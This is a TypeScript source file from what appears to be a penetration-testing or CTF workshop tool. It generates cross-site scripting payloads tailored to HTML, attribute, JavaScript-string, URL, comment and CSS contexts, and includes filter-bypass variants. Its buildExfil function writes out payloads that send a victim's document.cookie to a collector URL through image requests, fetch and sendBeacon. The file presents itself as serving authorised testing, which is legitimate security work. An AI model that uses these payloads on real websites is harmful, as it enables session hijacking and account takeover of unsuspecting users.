/**
 * Context-tailored XSS payloads and a cookie-exfil builder, for authorised CTF/pentest work.
 *
 * Everything here returns INERT TEXT: strings the workshop shows for the user to copy and use on
 * their own authorised target. Nothing is executed, fetched or sent from here. Each payload
 * carries a `bypass` reason (a small fixed enum) that the tool renders through a translation key.
 */
import type { XssContext } from './_xss-contexts';

export type Bypass =
  | 'base' // the straightforward payload for this context
  | 'img' // fires via an <img onerror>, so it works where <script> is stripped or inert
  | 'svg' // fires via <svg onload>, another no-<script> vector
  | 'body' // <body onload>, useful when other tags are filtered
  | 'iframe' // javascript: inside an <iframe src>
  | 'caseVary' // mixed case to get past a lowercase "script" blacklist
  | 'noParens' // calls without parentheses, to get past a "(" / ")" filter
  | 'closeTag' // close the current quote/tag first, then inject fresh markup
  | 'eventHandler' // no < > needed: stay in the tag and add an event handler
  | 'jsString' // close the JavaScript string, run code, reopen it
  | 'jsTemplate' // ${…} runs inside a template string, no quote needed
  | 'jsNoQuote' // already in code: just terminate the statement and run
  | 'commentClose' // close the HTML comment first
  | 'urlScheme'; // a javascript:/data: URL in a link or src

export interface Payload {
  payload: string;
  bypass: Bypass;
}

export type ExfilForm = 'imgScript' | 'imgOnerror' | 'fetch' | 'beacon';
export interface ExfilPayload {
  form: ExfilForm;
  payload: string;
}

/** A reliable, harmless payload for the sandbox demo: sets the title and calls the proof hook. */
export const SANDBOX_DEMO = `<img src=x onerror="window.__ftfFired&&__ftfFired('demo');document.title='XSS'">`;

const A = 'alert(1)';

const HTML: Payload[] = [
  { payload: `<script>${A}</script>`, bypass: 'base' },
  { payload: `<img src=x onerror=${A}>`, bypass: 'img' },
  { payload: `<svg onload=${A}>`, bypass: 'svg' },
  { payload: `<body onload=${A}>`, bypass: 'body' },
  { payload: `<ScRiPt>${A}</ScRiPt>`, bypass: 'caseVary' },
  { payload: `<iframe src=javascript:${A}>`, bypass: 'iframe' },
  { payload: '<svg onload=alert`1`>', bypass: 'noParens' },
];

const attr = (q: '"' | "'"): Payload[] => [
  { payload: `${q}><script>${A}</script>`, bypass: 'closeTag' },
  { payload: `${q}><img src=x onerror=${A}>`, bypass: 'img' },
  { payload: `${q} onmouseover=${q}${A}`, bypass: 'eventHandler' },
  { payload: `${q} autofocus onfocus=${q}${A}`, bypass: 'eventHandler' },
];

const ATTR_UNQUOTED: Payload[] = [
  { payload: ` onmouseover=${A} `, bypass: 'eventHandler' },
  { payload: ` autofocus onfocus=${A} `, bypass: 'eventHandler' },
  { payload: `><script>${A}</script>`, bypass: 'closeTag' },
  { payload: `><img src=x onerror=${A}>`, bypass: 'img' },
];

const TAG: Payload[] = [
  { payload: ` onmouseover=${A} `, bypass: 'eventHandler' },
  { payload: ` autofocus onfocus=${A} `, bypass: 'eventHandler' },
  { payload: `><img src=x onerror=${A}>`, bypass: 'closeTag' },
];

const EVENT_HANDLER: Payload[] = [
  { payload: A, bypass: 'base' },
  { payload: `');${A};//`, bypass: 'jsString' },
  { payload: `";${A};//`, bypass: 'jsString' },
];

const URL: Payload[] = [
  { payload: `javascript:${A}`, bypass: 'urlScheme' },
  { payload: `data:text/html,<script>${A}</script>`, bypass: 'urlScheme' },
  { payload: `javascript:alert\`1\``, bypass: 'noParens' },
];

const JS: Payload[] = [
  { payload: `;${A};`, bypass: 'jsNoQuote' },
  { payload: `${A}`, bypass: 'base' },
  { payload: `</script><img src=x onerror=${A}>`, bypass: 'closeTag' },
];

const jsString = (q: '"' | "'"): Payload[] => [
  { payload: `${q};${A};${q}`, bypass: 'jsString' },
  { payload: `${q}-${A}-${q}`, bypass: 'jsString' },
  { payload: `</script><script>${A}</script>`, bypass: 'closeTag' },
];

const JS_TEMPLATE: Payload[] = [
  { payload: `\${${A}}`, bypass: 'jsTemplate' },
  { payload: `\`;${A};\``, bypass: 'jsString' },
  { payload: `</script><script>${A}</script>`, bypass: 'closeTag' },
];

const COMMENT: Payload[] = [
  { payload: `--><script>${A}</script>`, bypass: 'commentClose' },
  { payload: `--><img src=x onerror=${A}>`, bypass: 'commentClose' },
];

const CSS: Payload[] = [
  { payload: `</style><script>${A}</script>`, bypass: 'closeTag' },
  { payload: `</style><img src=x onerror=${A}>`, bypass: 'closeTag' },
];

const TABLE: Record<XssContext, Payload[]> = {
  html: HTML,
  'attr-double': attr('"'),
  'attr-single': attr("'"),
  'attr-unquoted': ATTR_UNQUOTED,
  tag: TAG,
  'event-handler': EVENT_HANDLER,
  url: URL,
  js: JS,
  'js-string-double': jsString('"'),
  'js-string-single': jsString("'"),
  'js-string-template': JS_TEMPLATE,
  comment: COMMENT,
  css: CSS,
};

export function generatePayloads(context: XssContext): Payload[] {
  return TABLE[context] ?? HTML;
}

/** Trim a collector URL and choose the right query separator. */
function sep(url: string): string {
  return url.includes('?') ? '&' : '?';
}

/**
 * Cookie-exfil payloads that send to the user's OWN collector URL. The tool never contacts the
 * URL; these are text to paste into an authorised target. `document.cookie` is unreadable when
 * the victim's cookie is HttpOnly — the tool says so next to these.
 */
export function buildExfil(rawUrl: string): ExfilPayload[] {
  const url = rawUrl.trim().replace(/[?&]+$/, '');
  const s = sep(url);
  const q = `"${url}${s}c="+encodeURIComponent(document.cookie)`;
  return [
    { form: 'imgScript', payload: `<script>new Image().src=${q}</script>` },
    { form: 'imgOnerror', payload: `<img src=x onerror="this.src=${q}">` },
    { form: 'fetch', payload: `<script>fetch(${q})</script>` },
    {
      form: 'beacon',
      payload: `<script>navigator.sendBeacon("${url}","c="+document.cookie)</script>`,
    },
  ];
}
